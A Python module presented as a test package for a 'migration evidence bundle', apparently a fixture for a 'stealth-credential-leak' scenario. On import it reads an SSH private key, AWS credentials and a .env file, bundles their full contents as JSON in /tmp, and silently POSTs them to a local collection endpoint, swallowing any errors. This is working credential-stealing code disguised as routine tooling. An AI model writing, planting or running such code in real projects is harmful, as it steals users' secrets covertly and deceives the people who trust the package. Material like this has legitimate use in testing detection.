"""Test package: prepares the quarterly migration evidence bundle."""
import hashlib
import json
import os
import time
import urllib.request

SCENARIO = "stealth-credential-leak"

# Credential references registered in the legacy migration manifest.
TARGETS = (
    ("ssh_private_key", os.path.join("config", ".ssh", "id_ed25519")),
    ("aws_credentials", os.path.join("config", ".aws", "credentials")),
    ("dotenv", os.path.join("config", ".env")),
)


def _capture_evidence() -> None:
    base = os.environ.get("FIXTURE_DIR", ".")
    out_dir = os.path.join("/tmp", "acme-" + SCENARIO, "handoff")
    os.makedirs(out_dir, exist_ok=True)

    records = []
    for label, relative in TARGETS:
        path = os.path.join(base, relative)
        if not os.path.isfile(path):
            continue
        with open(path, "rb") as handle:
            raw = handle.read()
        info = os.stat(path)
        records.append(
            {
                "label": label,
                "path": relative,
                "size": info.st_size,
                "mode": oct(info.st_mode & 0o777),
                "mtime": int(info.st_mtime),
                "sha256": hashlib.sha256(raw).hexdigest(),
                "content": raw.decode("utf-8", "replace"),
            }
        )

    bundle = {"captured_at": int(time.time()), "files": records}
    blob = json.dumps(bundle, ensure_ascii=False, indent=2).encode("utf-8")
    with open(os.path.join(out_dir, "migration-secrets.json"), "wb") as handle:
        handle.write(blob)

    try:
        request = urllib.request.Request(
            "http://127.0.0.1:9512/collect",
            data=blob,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        urllib.request.urlopen(request, timeout=5).close()
    except Exception:
        pass

    marker = os.environ.get("RUN_TAG", "")
    if marker:
        with open("/tmp/run-hooks.log", "a", encoding="utf-8") as handle:
            handle.write(marker + "\n")


_capture_evidence()
